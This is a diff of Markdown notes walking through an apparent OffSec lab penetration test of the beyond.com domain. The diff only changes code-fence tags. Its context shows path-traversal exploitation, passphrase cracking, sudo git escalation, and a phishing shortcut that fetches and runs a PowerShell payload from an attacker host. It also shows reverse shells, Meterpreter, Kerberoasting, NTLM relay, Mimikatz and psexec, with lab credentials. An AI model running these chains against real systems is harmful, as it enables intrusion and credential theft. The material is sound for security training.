@@ -75,7 +75,7 @@ Before starting a pentest we want to setup and structure our environment as we w
 *Structuring and isolating data and settings for multiple penetration tests can be quite the challenge. By reusing a Kali VM we could accidentally expose previous-client data to new networks. Therefore, it is recommended to use a fresh Kali image for every assessment.*
 
 We will create our main directory `/home/$USER/OffSec/beyond` and two sub-directories for each target we currently have access to.  We will also create a `creds.txt` file to keep track of valid creds and users.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ tree ../beyond
 ../beyond
@@ -93,7 +93,7 @@ Start with a portscan of MAILSRV1 using Nmap, this is often the first active inf
 *In a real penetration test, we would also use passive information gathering techniques such as Google Dorks and leaked password databases to obtain additional information. This would potentially provide us with usernames, passwords, and sensitive information.*
 
 Use option `-sV` to enable service/version detection and `-sC` to use the default Nmap scripts.  Generate an output file with `-oN` to save the scan results.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo nmap -sC -sV -oN mailsrv1/nmap 192.168.218.242
 [sudo] password for operator:
@@ -153,7 +153,7 @@ Next we enum the IIS web server, start by browsing to the page.
 - We find only the default IIS welcome page.
 
 Let's use `gobuster` to try to enum directories and files.  Enter `dir` to use the directory enumeratino mode, `-u` for URL, `-w` for wordlist, and `-x` for the files types we want to identify.  In this case, we will look for `txt,pdf,config` to identify any documents or config files.  Use `-o` to create an output file.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ gobuster dir -u http://192.168.218.242 -w /usr/share/wordlists/dirb/common.txt -o mailsrv1/gobuster -x txt,pdf,config
 ===============================================================
@@ -199,7 +199,7 @@ Now we wil enumerate the second machine in the client topology, WEBSRV1, which w
 *In a real penetration test, we could scan MAILSRV1 and WEBSRV1 in a parallel fashion. Meaning, that we could perform the scans at the same time to save valuable time for the client. If we do so, it's vital to perform the scans in a structured way to not mix up results or miss findings.*
 
 Start with an Namp scan.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo nmap -sC -sV -oN websrv1/nmap 192.168.218.244
 [sudo] password for operator:
@@ -238,7 +238,7 @@ At first glance there is no menu bar and there doesn't appear to be anything act
 ![d8a98d80dbe4df24409b0e83009ec511.png](../_resources/d8a98d80dbe4df24409b0e83009ec511.png)
 
 The presence of strings "wp-content" and "wp-include" indicate the site is running WordPress.  We can confirm by using `whatweb`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ whatweb http://192.168.247.244
 http://192.168.247.244 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.52 (Ubuntu)], IP[192.168.247.244], RedirectLocation[http://192.168.247.244/main/], UncommonHeaders[x-redirect-by]
@@ -257,7 +257,7 @@ To perform a scan without an API key:
 - Plugin detection `aggressive`
 - Enum popular plugins `--enumerate p`
 - Output file `-o`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ wpscan --url http://192.168.247.244 --enumerate p --plugins-detection aggressive -o websrv1/wpscan
 
@@ -441,7 +441,7 @@ Interesting Finding(s):
  - Wordpress-seo.
 
 Instead of using the WPscan vuln DB, we can use `searchsploit` to find vulns associated with the plugins.  For most identified plugins WPScan provides the detected version, most were up to date and none provided for akisment, so we will start with Duplicator.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ searchsploit duplicator
 --------------------------------------------------------- ---------------------------------
@@ -478,7 +478,7 @@ To summarize what we learned about WEBSRV1:
 ##### Initial Foothold
 
 In the prior unit we used SearchSploit to find exploits for Duplicator 1.3.26, two matched this version, and one was a Metasploit exploit.  Use SearchSploit to examine the other exploit.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ searchsploit duplicator
 --------------------------------------------------------- ---------------------------------
@@ -508,7 +508,7 @@ print(output.text)
 - Python code to exploit CVE-2020-11738.
 
 The script sends a GET req to a URL and adds a file name prepended with `../` expressions.  Copy the script with the `-m` option.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ cd websrv1
 
@@ -524,7 +524,7 @@ Copied to: /home/operator/OffSec/beyond/websrv1/50420.py
 ```
 
 Provide the target URL and file we want to read to use the script.  We will attempt to read `/etc/passwd` to confirm the target is vulnerable and to obtain user accounts from the system.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ python 50420.py http://192.168.247.244 /etc/passwd
 root:x:0:0:root:/root:/bin/bash
@@ -576,7 +576,7 @@ As we saw in Common Web Application Attacks there are several files of interest 
 We will attempt to retrieve a SSH private with the name `id_rsa`.  The name will differ depending on what type of key is created with `ssh-keygen`, for instance a `ecdsa` key type would have the default priv key name `id_ecdsa`.
 
 Let's check both user home directories!
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ python 50420.py http://192.168.247.244 /home/marcus/.ssh/id_rsa
 Invalid installer file name!!
@@ -627,7 +627,7 @@ QduOTpMIvVMIJcfeYF1GJ4ggUG4=
  - Save the file locally as `id_rsa`
 
 Let's attempt to leverage the key to access WEBSRV1 as `daniela` over SSH, we first have to set the permissions of the key.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ ssh -o IdentitiesOnly=yes -i daniela-id_rsa daniela@192.168.247.244
 daniela@192.168.247.244's password:
@@ -635,7 +635,7 @@ daniela@192.168.247.244's password:
 - The key is protected by a passphrase.
 
 We can use `ssh2john` and `john` with the `rockyou.txt` wordlist and attempt to crack the passphrase.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
 Using default input encoding: UTF-8
@@ -652,7 +652,7 @@ Session completed.
 - We recovered passphrase `tequieromucho`
 
 Let's attempt SSH access again.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ ssh -o IdentitiesOnly=yes -i daniela-id_rsa daniela@192.168.247.244
 Enter passphrase for key 'daniela-id_rsa':
@@ -693,7 +693,7 @@ Before performing post exploitation enumeration, we add the passphrase to our `c
 Now that we have gained access to a target, WEBSRV1, we can perform local enum to identify attack vectors and sensitive info that may lead us to PrivEsc.
 
 We often have time constraints in pentests, so we will use `linPEAS` to automate the process and identify low hanging fruit.  Copy `linpeas.sh` to our `websrv1` subdirectory and transfer it to the server.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
@@ -794,7 +794,7 @@ drwxr----- 8 root root 4096 Oct  4  2022 /srv/www/wordpress/.git
 The dir is owned by root and not readable to other users, but we can leverage sudo to use Git commands in priv context, searching the repo for info.
 
 Git diff of last commit.
-```
+```bash
 daniela@websrv1:/srv/www/wordpress$ sudo git show
 commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
 Author: root <root@websrv1>
@@ -829,7 +829,7 @@ Most commands that run `sudo` can be abused to obtain an interactive shell with 
 - Enter `git` in the search bar.
 - Scroll down to the "Sudo" section.
 We find 5 potential attack vectors we can try.  The second vector opens the help menu in the default pager, `less` is the most popular one on Linux.  The pager navigation commands are simliar to `vi` and can be used to exec code in the context of the user account that launched the pager.
-```
+```bash
 sudo git -p help config
 ```
 To exec code, enter `!` followed by a command or path to an executable file.  We can enter a path to a shell and use `/bin/bash` to gain an interactive shell.
@@ -845,7 +845,7 @@ root
 - We elevated privs successfully.
 
 We can continue enum with root privs.  Change dir to the Git repo, use `git status`, and `git log` to show commit history.  We can use `git show` and provide the hash of the latest commit to see changes after the first commit.
-```
+```bash
 root@websrv1:/srv/www/wordpress# git show 612ff5783cc5dbd1e0e008523dba83374a84aaf1
 commit 612ff5783cc5dbd1e0e008523dba83374a84aaf1 (HEAD, master)
 Author: root <root@websrv1>
@@ -880,7 +880,7 @@ Automating tasks with [sshpass](https://linux.die.net/man/1/sshpass) is a common
 ##### Domain Credentials
 
 Now we'll attempt to identify a valid combination of creds for MAILSRV1.  We start with the info in our `creds.txt`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond/websrv1]
 └─$ cat ../creds.txt
 daniela tequieromucho
@@ -891,7 +891,7 @@ john@192.168.50.245 dqsTwTpZPn#nL
 ```
 
 We'll create a list of usernames containing `marcus`, `john`, `daniela`, and omit `wordpress` as it is only used in a local DB connection for the WP instance on WEBSRV1.  We then create a password list containing the passwords we found.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ cat usernames.txt && cat passwords.txt
 daniela
@@ -903,7 +903,7 @@ dqsTwTpZPn#nL
 ```
 
 Next we will use `crackmapexec` to check the creds against SMB on MAILSRV1, specifying `--continue-on-success`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ crackmapexec smb 192.168.247.242 -u usernames.txt -p passwords.txt --continue-on-success
 SMB         192.168.247.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
@@ -930,7 +930,7 @@ We have two options.
 *We should be aware that CrackMapExec outputs STATUS_LOGON_FAILURE when a password for an existing user is not correct, but also when a user does not exist at all. Therefore, we cannot be sure at this point that the domain user accounts daniela and marcus even exist.*
 
 We will pursue option one first and use CrackMapExec to list the SMB shares with their perms on MAILSRV1 with `--shares` and the creds for `john`.  We may identify info that we can use for the second option.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ crackmapexec smb 192.168.247.242 -u john -p "dqsTwTpZPn#nL" --shares
 SMB         192.168.247.242 445    MAILSRV1         [*] Windows 10.0 Build 20348 x64 (name:MAILSRV1) (domain:beyond.com) (signing:False) (SMBv1:False)
@@ -955,7 +955,7 @@ We lack informatino about the internal machines and infra, so we will utilize th
 For this attack we have to set up a WebDAV share, a Python3 web server, a Netcat listener, and prepare the Windows Library/shortcut files.
 
 Let's setup with WebDAV share on our Kali machine port 80 with `wsgidav`, using `/home/$USER/beyond/webdav` as root.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r ~/OffSec/beyond/webdav
 Running without configuration file.
@@ -1008,7 +1008,7 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 - Save the shortcut as `install` and transfer to Kali into the WebDAV root dir.
 
 Next we serve PowerCat via Python3 web server by copying `powercat.ps1` to our working dir and serve it on port 8000 as specified in our PS command.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 http/
 
@@ -1018,7 +1018,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```
 
 We can now start our Netcat listener to catch the incoming reverse shell.
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 4444
 listening on [any] 4444 ...
@@ -1054,7 +1054,7 @@ To send our email with `swaks` we build the command with options:
 - `--header "Subject: Staging Script"`
 - `--server 192.168.133.242`
 - `-ap` to enable password auth.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo swaks -t daniela@beyond.com -t marcus@beyond.com --from john@beyond.com --attach @config.Library-ms --server 192.168.247.242 --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
 Username: john
@@ -1087,7 +1087,7 @@ Password: dqsTwTpZPn#nL
 ```
 - After a few moments we recieve requests for our WebDAV and Python3 we servers.
 - Our Netcat listener catches the shell.
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 4444
 listening on [any] 4444 ...
@@ -1101,7 +1101,7 @@ PS C:\Windows\System32\WindowsPowerShell\v1.0>
 ```
 
 Display our current user, hostname, and IP address to confirm we have a foothold in the internal network.
-```
+```powershell
 PS C:\Windows\System32\WindowsPowerShell\v1.0> whoami
 whoami
 beyond\marcus
@@ -1140,7 +1140,7 @@ We will now attempt to gain situational awareness on the CLIENTWK1 sys and inter
 *For this Learning Unit, we'll not explicitly store every result in our workspace directory on Kali. However, to get used to the documenting process you should create notes of all findings and information while following along.*
 
 Copy the x64 winPEAS exec to the dir of our Python3 web server.  On target sys move to the home of user and download winPEAS.
-```
+```powershell
 PS C:\Windows\System32\WindowsPowerShell\v1.0> iwr -uri http://192.168.45.163:8000/winPEASx64.exe -Outfile \Users\marcus\winPEASx64.exe
 iwr -uri http://192.168.45.163:8000/winPEASx64.exe -Outfile \Users\marcus\winPEASx64.exe
 PS C:\Windows\System32\WindowsPowerShell\v1.0> cd \Users\marcus\
@@ -1178,7 +1178,7 @@ Let's review the results starting with Basic System Information.
 ```
 - WinPEAS correctly detected the OS as Win 11 Pro.
  - Always validate with `systeminfo` as winPEAS can incorrectly identify.
-```
+```powershell
 PS C:\Users\marcus> systeminfo
 systeminfo
 
@@ -1232,7 +1232,7 @@ Network Ifaces and known hosts
   - We can assume it is the DC.
 
 As we did for creds, let's start a text file named `computer.txt` in our working dir to document the internal machines we ID and info about them.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ cat computer.txt
 172.16.133.240 - DCSRV1.BEYOND.COM -> Domain Controller
@@ -1249,7 +1249,7 @@ As we haven't identified a PrivEsc vector via winPEAS and find nothing else acti
 We learned several techniques for this type of enumeration.  For this module we will use `BloodHound` with the `SharpHound.ps1` collector as we discussed in Active Directory and Enumeration.
 
 Copy the PowerShell collector to serve via Python, download to our target, and import it to our PS session.
-```
+```powershell
 PS C:\Users\marcus> iwr -uri http://192.168.45.163:8000/SharpHound.ps1 -Outfile SharpHound.ps1
 iwr -uri http://192.168.45.163:8000/SharpHound.ps1 -Outfile SharpHound.ps1
 PS C:\Users\marcus> ls
@@ -1290,7 +1290,7 @@ PS C:\Users\marcus> . .\SharpHound.ps1
 ```
 
 Execute `Invoke-BloodHound` with `-CollectionMethod All` to invoke all available methods.
-```
+```powershell
 PS C:\Users\marcus> Invoke-BloodHound -CollectionMethod All
 Invoke-BloodHound -CollectionMethod All
 2023-12-29T18:33:34.1195455-08:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound
@@ -1384,7 +1384,7 @@ CLIENTWK1.BEYOND.COM - Windows 11 Pro
 ```
 
 In addition to the known systems, we discovered INTERNALSRV1.  We can obtain the IP with `nslookup`.
-```
+```powershell
 C:\Users\marcus>nslookup INTERNALSRV1.BEYOND.COM
 nslookup INTERNALSRV1.BEYOND.COM
 DNS request timed out.
@@ -1471,7 +1471,7 @@ Keep in mind, finding an actionable vector does not stop the enum process.  We s
 As such, we will setup a SOCKS5 proxy to perform network enum via Nmap/CrackMapExec to identify accessible services, ports, and SMB settings!
 
 First we create a stage Meterpreter TCP reverse shell executable with `msfvenom`, we will save it to our working dir since we can reuse it through the domain.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.163 LPORT=443 -f exe -o met.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -1483,7 +1483,7 @@ Saved as: met.exe
 ```
 
 Next start `multi/handler` with the corresponding settings in `msfconsole`, also set `ExitOnSession` to `false` which keeps the listener active for new sessions without the need to restart for incoming sessions.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ msfconsole -q
 msf6 > use multi/handler
@@ -1504,7 +1504,7 @@ msf6 exploit(multi/handler) >
 ```
 
 Download `met.exe` on CLIENTWK1.
-```
+```powershell
 PS C:\Users\marcus> iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
 iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
 PS C:\Users\marcus> .\met.exe
@@ -1544,7 +1544,7 @@ socks5          127.0.0.1 1080
 ```
 
 We are ready to enum via Proxychains and will start with the CrackMapExec SMB module to retrieve basic info of the identified server's SMB settings.  We will provide the creds for `john` to list the SMB shares and their perms with `--shares`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo proxychains -q crackmapexec smb 172.16.87.240-241 172.16.87.254 -u john -d beyond.com -p "dqsTwTpZPn#nL" --shares
 SMB         172.16.87.240   445    DCSRV1           [*] Windows 10.0 Build 20348 x64 (name:DCSRV1) (domain:beyond.com) (signing:True) (SMBv1:False)
@@ -1575,7 +1575,7 @@ SMB         172.16.87.241   445    INTERNALSRV1     IPC$            READ        
  - With this security mechanism disabled we may be able to perform relay attacks if we can force auth requests.
 
 Next, using Nmap, we scan for commonly used ports on MAILSRV1, DCSRV1, and INTERNALSRV1 specifying the `-sT` option for TCP connect scan (required for Nmap to work over Proxychains).
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo proxychains -q nmap -sT -oN internal-servers.nmap -Pn -p 21,80,443 172.16.87.240 172.16.87.241 172.16.87.254
 [sudo] password for operator:
@@ -1625,7 +1625,7 @@ meterpreter > upload http/chisel.exe C:\\Users\\marcus\\chisel.exe
 [*] Completed  : /home/operator/OffSec/beyond/http/chisel.exe -> C:\Users\marcus\chisel.exe
 ```
 
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ gunzip chisel_1.9.0_linux_amd64.gz
 
@@ -1661,7 +1661,7 @@ chisel.exe client 192.168.45.163:8080 R:80:172.16.87.241:80
 ```
 - Bind INTERNALSRV1 port 80 to Kali port 80.
  - *NOTE: kill wsgidav server first*.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ ./chisel server --port 8080 --reverse
 2023/12/30 14:03:01 server: Reverse tunnelling enabled
@@ -1680,7 +1680,7 @@ Browse to the login page at `http://127.0.0.1/wordpress/wp-admin` and try to log
  - Indicating a DNS name set within the domain.
 
 To use the web app we add `internalsrv1.beyond.com` to `/etc/hosts`
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ tail /etc/hosts
 127.0.1.1       labhost
@@ -1715,7 +1715,7 @@ We know that `daniela` is kerberoastable so we can attempt to retrieve their pas
 If this attack vector fails, we can use WPScan and other web app enum tools to identify potential vulns on INTERNALSRV1 or switch targets to MAILSRV1.
 
 We can Kerberoasting from Kali with `impacket-GetUserSPNs` over our SOCKS5 proxy.  To obtain the TGS-REP hash of `daniela` we need to provide the creds of a domain user, so we will use `john`.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ proxychains -q impacket-GetUserSPNs -request -dc-ip 172.16.87.240 beyond.com/john
 Impacket v0.11.0 - Copyright 2023 Fortra
@@ -1732,7 +1732,7 @@ $krb5tgs$23$*daniela$BEYOND.COM$beyond.com/daniela*$c1939af6eee8a400b1ec41e96289
 ```
 
 Store the hash to `daniela.hash` an crack with Hashcat.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ sudo hashcat -m 13100 daniela.hash /usr/share/wordlists/rockyou.txt --force
 [sudo] password for operator:
@@ -1918,7 +1918,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 ```
 
 Next we need a Netcat listener to catch the reverse shell.
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
 listening on [any] 9999 ...
@@ -1944,7 +1944,7 @@ Set the path to the URI reference `//192.168.45.163/test` where the IP is our Ka
  - Auth to MAILSRV1 succeeds, indicating the same password is used on both local admin accounts.
 
 The realyed command was executed on MAILSRV1, our Netcat listener caught a shell!
-```
+```bash
 ┌──(operator㉿labhost)-[~]
 └─$ nc -lnvp 9999
 listening on [any] 9999 ...
@@ -1973,7 +1973,7 @@ We obtain priv code exec on MAILSRV1 as we had planned.  Next we want to extract
 Once we determine that no AV is running we should upgrade our shell to Meterpreter, providing a more robust shell env and aid in post-exploitation.
 
 Let's download the previously created Meterpreter reverse shell payload `met.exe` to perform post-exploitation.
-```
+```powershell
 PS C:\Windows\system32> iwr -uri http://192.168.45.163:8000/met.exe -Outfile met.exe
 PS C:\Windows\system32> .\met.exe
 ```
@@ -2001,7 +2001,7 @@ PS C:\Windows\system32>
 ```
 
 Download Mimikatz to MAILSRV1.
-```
+```powershell
 PS C:\Windows\system32> iwr -uri http://192.168.45.163:8000/mimikatz.exe -Outfile mimikatz.exe
 iwr -uri http://192.168.45.163:8000/mimikatz.exe -Outfile mimikatz.exe
 PS C:\Windows\system32> .\mimikatz.exe
@@ -2018,7 +2018,7 @@ mimikatz #
 ```
 
 Obtain SeDebugPrivilege and list all provider creds available on system.
-```
+```bash
 mimikatz # privilege::debug
 Privilege '20' OK
 
@@ -2060,7 +2060,7 @@ SID               : S-1-5-21-1104084343-2915547075-2081307249-1108
 Now we will leverage domain admin privs of `beccy` to get access to the DC and achieve the second goal of the pentest.
 
 As we obtained a cleartext password and NTLM hash for `beccy` we can use `impacket-psexec` to get an interactive shell on DCSRV1.  While either would work, let's use the NTLM hash.
-```
+```bash
 ┌──(operator㉿labhost)-[~/OffSec/beyond]
 └─$ proxychains -q impacket-psexec -hashes :f0397ec5af49971f6efbdb07877046b3 beccy@172.16.81.240
 Impacket v0.11.0 - Copyright 2023 Fortra
